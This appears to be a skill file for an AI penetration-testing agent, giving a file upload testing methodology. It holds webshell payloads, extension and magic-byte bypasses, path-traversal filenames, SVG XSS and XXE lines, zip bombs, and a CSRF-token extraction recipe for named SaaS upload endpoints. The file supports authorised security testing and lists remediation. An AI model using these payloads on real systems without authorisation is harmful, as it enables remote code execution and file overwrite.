---
name: file-upload-testing
description: File upload vulnerability testing — webshells, bypass, path traversal
origin: Vigil
---

# File Upload Vulnerability Testing

> **`vigil assess kali` audit flags:** use `--technique RCE` for webshell/polyglot uploads (the canonical dangerous outcome). Switch to `LFI` when the filename triggers path traversal, `XSS` for SVG/HTML reflected in a browser context, or `SSRF` when the upload path fetches a URL server-side.

## When to Activate

- Application allows file upload (profile picture, document, attachment)
- File processing features (image resize, PDF conversion, import)
- Any endpoint accepting multipart/form-data

## Tools

- `vigil assess kali exec -- curl ...` (multipart upload — all target-facing curl must go through the kali exec wrapper; use `--technique RCE --probe-kind payload --phase consume-test --timeout 60 --destructive` for webshell upload attempts)
- Burp Suite Repeater (modify upload requests — use to craft the payload, then replay via kali exec)
- ExifTool (embed payloads in metadata — host-side payload preparation only)
- Custom polyglot file generators (host-side preparation only)

## Methodology

### 1. Understand Upload Mechanism

- [ ] Identify upload endpoint and parameters
- [ ] Check allowed file types (client-side vs server-side validation)
- [ ] Determine where files are stored (same domain, CDN, S3)
- [ ] Check if uploaded files are directly accessible via URL
- [ ] Check if filename is preserved or randomized
- [ ] Identify whether the upload is CSRF-gated (see next section)

### 1a. CSRF-gated upload flows

Most enterprise SaaS upload bridges require a CSRF token extracted from a prior authenticated request. Direct POST to the upload endpoint fails with a 403 / "Invalid token" response even when the auth cookies are correct. Specialists that skip the CSRF step waste dispatch time attempting bypasses against the wrong layer.

**Where this pattern shows up:**

- Salesforce Chatter attachment bridges (`/services/data/.../sobjects/Attachment/`, `/sfsites/c/aura?aura.token=...` POST envelopes)
- ServiceNow attachment uploader (`/api/now/attachment/file?...` with `X-UserToken` header)
- Confluence / Jira attach endpoints (`atl_token` query param required)
- Microsoft 365 SharePoint document upload (`X-RequestDigest` header)
- Custom Rails apps (`<meta name="csrf-token">` in the page HTML + `X-CSRF-Token` header on POST)

**Extraction recipe:**

1. GET an authenticated page where the upload UI is rendered (the upload form's host page, settings panel, or a connector configuration screen).
2. Extract the token from one of: `<meta name="csrf-token" content="...">`, a hidden `<input name="authenticity_token">` / `<input name="atl_token">`, a cookie like `XSRF-TOKEN`, or an `X-RequestDigest`/`X-UserToken` response header on a prior GET.
3. Replay the upload POST with the token in the **expected channel** — header (`X-CSRF-Token`, `X-RequestDigest`, `X-UserToken`) OR form field (`authenticity_token`, `atl_token`) OR query param. Mixing channels is a common failure shape: the server checks the header but the agent put the token in the body, or vice versa.
4. Re-fetch the token between attempts when the server rotates per-request (Microsoft `X-RequestDigest` expires after one use).

When the bridge passes the CSRF check, **then** apply the extension / content-type / magic-byte bypass methodology below. Most CSRF-gated bridges have weak post-CSRF validation because the developer assumed CSRF was the security boundary.

If CSRF cannot be passed in-session (token-binding to the originating session works, but the form-encoding requires a browser-rendered nonce you can't reproduce), pivot the dispatch shape: capture the entire upload flow via mitmproxy with a live browser session, then replay the captured request with the magic-byte/content-type variation. The mitmproxy capture gives you a known-good baseline against which to diff.

### 2. Extension Bypass

- [ ] Double extension: `shell.php.jpg`, `shell.php.png`
- [ ] Null byte (legacy): `shell.php%00.jpg`, `shell.php\x00.jpg`
- [ ] Case variation: `shell.PhP`, `shell.pHP`, `shell.Php`
- [ ] Alternative extensions: `.php3`, `.php5`, `.phtml`, `.phar`
- [ ] JSP alternatives: `.jspx`, `.jsw`, `.jsv`
- [ ] ASP alternatives: `.aspx`, `.ascx`, `.ashx`, `.asa`, `.cer`
- [ ] Trailing characters: `shell.php.`, `shell.php...`, `shell.php `, `shell.php::$DATA`
- [ ] Upload `.htaccess` to add custom handler: `AddType application/x-httpd-php .xyz`
- [ ] Upload `.user.ini` with `auto_prepend_file=shell.jpg`

### 3. Content-Type Bypass

- [ ] Change `Content-Type` to `image/jpeg` or `image/png` while sending PHP
- [ ] Remove Content-Type header entirely
- [ ] Use valid MIME type for allowed format

### 4. Magic Bytes / Content Bypass

- [ ] Prepend valid image header: `GIF89a;<?php system($_GET['c']); ?>`
- [ ] Add JPEG magic bytes `FF D8 FF E0` before payload
- [ ] PNG header + PHP code in IDAT chunk
- [ ] Embed PHP in EXIF data: `exiftool -Comment='<?php system("id"); ?>' image.jpg`
- [ ] Polyglot file: valid image that is also valid PHP

### 5. Webshell Payloads

- [ ] PHP: `<?php system($_GET['c']); ?>`
- [ ] PHP short tag: `<?=`cat /etc/passwd`?>`
- [ ] JSP: `<% Runtime.getRuntime().exec(request.getParameter("c")); %>`
- [ ] ASPX: `<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd","/c " + Request["c"]); %>`
- [ ] Minimal: `<?=phpinfo();?>` to confirm execution

### 6. Path Traversal in Filename

- [ ] `../../../var/www/html/shell.php`
- [ ] `..%2f..%2f..%2fshell.php`
- [ ] `....//....//shell.php`
- [ ] Overwrite existing files: `../../config.php`
- [ ] Target web root or cron directories

### 7. Special File Attacks

- [ ] SVG with XSS: `<svg onload="alert(1)">` or `<script>` in SVG
- [ ] SVG with XXE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- [ ] HTML file upload → stored XSS
- [ ] PDF with JavaScript
- [ ] ZIP slip: archive with `../../` path entries
- [ ] XML file with XXE (DOCX, XLSX inner XML)

### 8. Size and Resource Limits

- [ ] Upload extremely large file — check size limits
- [ ] Upload many files rapidly — check rate limits
- [ ] Zip bomb / decompression bomb
- [ ] Image with huge dimensions (pixel flood)

## What to Record

- Upload endpoint and filename parameter
- Bypass technique used (extension, content-type, magic bytes)
- Uploaded file URL and whether it executes — confirming the file was accepted and stored is not enough; you must show the **attacker outcome** (e.g., the uploaded `shell.php` executed via `GET /uploads/shell.php?c=id` and returned `uid=33(www-data)`, the SVG with XSS triggered JavaScript execution in the admin's browser when they viewed the file manager, the path traversal overwrote `/var/www/html/index.php` with a webshell confirming write access to the web root)
- Webshell payload and confirmed RCE
- Path traversal success and file overwritten
- Severity: Critical (RCE via webshell) or High (XSS, file overwrite)
- Remediation: allowlist extensions, validate content, rename files, store outside webroot

## Extended Resources

- `agent/references/payloads/upload-payloads.md` — extension bypass, Content-Type bypass, magic bytes, SVG XSS, zip slip
